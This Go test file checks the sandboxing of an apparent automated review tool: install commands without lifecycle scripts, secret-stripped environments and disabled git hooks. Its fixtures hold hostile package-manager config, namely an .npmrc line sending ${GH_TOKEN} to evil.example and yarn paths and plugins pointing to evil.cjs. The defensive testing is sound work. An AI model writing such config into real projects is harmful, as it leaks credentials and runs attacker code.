package review

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestInstallCommand(t *testing.T) {
	cases := []struct {
		files []string
		want  string
	}{
		{nil, ""},
		{[]string{"pnpm-lock.yaml"}, "pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile"},
		{[]string{"yarn.lock"}, "yarn install --frozen-lockfile --ignore-scripts"},
		{[]string{"yarn.lock", ".yarnrc.yml"}, "yarn install --immutable --mode=skip-build"},
		{[]string{"package-lock.json"}, "npm ci --ignore-scripts"},
		{[]string{"package.json"}, "npm install --ignore-scripts"},
	}
	for _, c := range cases {
		dir := t.TempDir()
		for _, f := range c.files {
			writeFile(t, filepath.Join(dir, f), "")
		}
		if got := strings.Join(InstallCommand(dir), " "); got != c.want {
			t.Errorf("%v: got %q want %q", c.files, got, c.want)
		}
	}
}

func TestInstallScriptUsesNvm(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "package-lock.json"), "")
	if got := installScript(dir); got != "npm ci --ignore-scripts" {
		t.Errorf("without nvmrc got %q", got)
	}
	writeFile(t, filepath.Join(dir, ".nvmrc"), "20")
	got := installScript(dir)
	if !strings.Contains(got, "nvm.sh") || !strings.Contains(got, "nvm install") || !strings.HasSuffix(got, "npm ci --ignore-scripts") {
		t.Errorf("with nvmrc got %q", got)
	}
	if installScript(t.TempDir()) != "" {
		t.Errorf("no lockfile should give empty script")
	}
}

func TestRiskyRepoConfigSkipsTheInstall(t *testing.T) {
	cases := map[string]string{
		".npmrc":      "//evil.example/:_authToken=${GH_TOKEN}\n",
		".yarnrc.yml": "yarnPath: .yarn/releases/evil.cjs\n",
		".yarnrc":     "yarn-path \"./evil.js\"\n",
	}
	for name, content := range cases {
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, "package-lock.json"), "")
		writeFile(t, filepath.Join(dir, name), content)
		if reason := riskyInstallConfig(dir); reason == "" || !strings.Contains(reason, name) {
			t.Errorf("%s: reason = %q", name, reason)
		}
		if script := installScript(dir); script != "" {
			t.Errorf("%s: install should be skipped, got %q", name, script)
		}
	}
	for _, yarnLine := range []string{"plugins:\n  - path: evil.cjs\n", "npmAuthToken: ${NPM_TOKEN}\n"} {
		dir := t.TempDir()
		writeFile(t, filepath.Join(dir, ".yarnrc.yml"), yarnLine)
		if riskyInstallConfig(dir) == "" {
			t.Errorf("yarnrc %q should be risky", yarnLine)
		}
	}
	safe := t.TempDir()
	writeFile(t, filepath.Join(safe, ".npmrc"), "save-exact=true\n")
	writeFile(t, filepath.Join(safe, ".yarnrc.yml"), "nodeLinker: node-modules\n")
	if reason := riskyInstallConfig(safe); reason != "" {
		t.Errorf("plain config should be fine, got %q", reason)
	}
}

func TestInstallEnvDropsSecrets(t *testing.T) {
	t.Setenv("GH_TOKEN", "secret-gh")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "secret-aws")
	t.Setenv("LC_ALL", "en_US.UTF-8")
	env := strings.Join(installEnv(), "\n")
	for _, secret := range []string{"secret-gh", "secret-aws"} {
		if strings.Contains(env, secret) {
			t.Errorf("install env leaks %s:\n%s", secret, env)
		}
	}
	for _, want := range []string{"PATH=", "HOME=", "LC_ALL=en_US.UTF-8", "YARN_IGNORE_PATH=1", "CI=true", "GIT_TERMINAL_PROMPT=0", "GIT_CONFIG_KEY_0=core.hooksPath"} {
		if !strings.Contains(env, want) {
			t.Errorf("install env missing %s", want)
		}
	}
}

func TestReviewEnvKeepsClaudeSettingsOnly(t *testing.T) {
	t.Setenv("GH_TOKEN", "secret-gh")
	t.Setenv("ANTHROPIC_BASE_URL", "https://gateway.example")
	t.Setenv("CLAUDE_CODE_USE_BEDROCK", "1")
	env := strings.Join(ReviewEnv(), "\n")
	if strings.Contains(env, "secret-gh") || !strings.Contains(env, "ANTHROPIC_BASE_URL=https://gateway.example") || !strings.Contains(env, "CLAUDE_CODE_USE_BEDROCK=1") || !strings.Contains(env, "PATH=") {
		t.Errorf("review env:\n%s", env)
	}
}

func TestGitStepsIgnoreRepoHooks(t *testing.T) {
	env := strings.Join(stepEnv(), "\n")
	for _, want := range []string{"GIT_CONFIG_COUNT=2", "GIT_CONFIG_KEY_0=core.hooksPath", "GIT_CONFIG_VALUE_0=/dev/null", "GIT_CONFIG_KEY_1=core.fsmonitor", "GIT_CONFIG_VALUE_1=false"} {
		if !strings.Contains(env, want) {
			t.Errorf("git step env missing %s", want)
		}
	}
}

func TestEnvAllowlistsKeepWhatRealSetupsNeed(t *testing.T) {
	kept := map[string]string{
		"NPM_TOKEN": "npm-auth", "npm_config_registry": "https://registry.example", "NODE_EXTRA_CA_CERTS": "/ca.pem", "SSL_CERT_FILE": "/cert.pem",
		"SSH_AUTH_SOCK": "/agent.sock", "VOLTA_HOME": "/volta", "ASDF_DATA_DIR": "/asdf", "PNPM_HOME": "/pnpm", "COREPACK_HOME": "/corepack",
	}
	for name, value := range kept {
		t.Setenv(name, value)
	}
	t.Setenv("GH_TOKEN", "secret-gh")
	install := strings.Join(installEnv(), "\n")
	for name, value := range kept {
		if !strings.Contains(install, name+"="+value) {
			t.Errorf("install env should keep %s", name)
		}
	}
	reviewKept := map[string]string{"GH_HOST": "git.example.com", "GH_CONFIG_DIR": "/gh", "AWS_PROFILE": "bedrock", "AWS_REGION": "us-east-1", "CLOUD_ML_REGION": "us-east5", "GOOGLE_APPLICATION_CREDENTIALS": "/gcp.json", "REQUESTS_CA_BUNDLE": "/bundle.pem"}
	for name, value := range reviewKept {
		t.Setenv(name, value)
	}
	t.Setenv("AWS_SECRET_ACCESS_KEY", "secret-aws")
	reviewEnv := strings.Join(ReviewEnv(), "\n")
	for name, value := range reviewKept {
		if !strings.Contains(reviewEnv, name+"="+value) {
			t.Errorf("review env should keep %s", name)
		}
	}
	for _, secret := range []string{"secret-gh", "secret-aws", "npm-auth"} {
		if strings.Contains(reviewEnv, secret) {
			t.Errorf("review env leaks %s", secret)
		}
	}
	if strings.Contains(install, "secret-gh") {
		t.Errorf("install env leaks GH_TOKEN")
	}
}
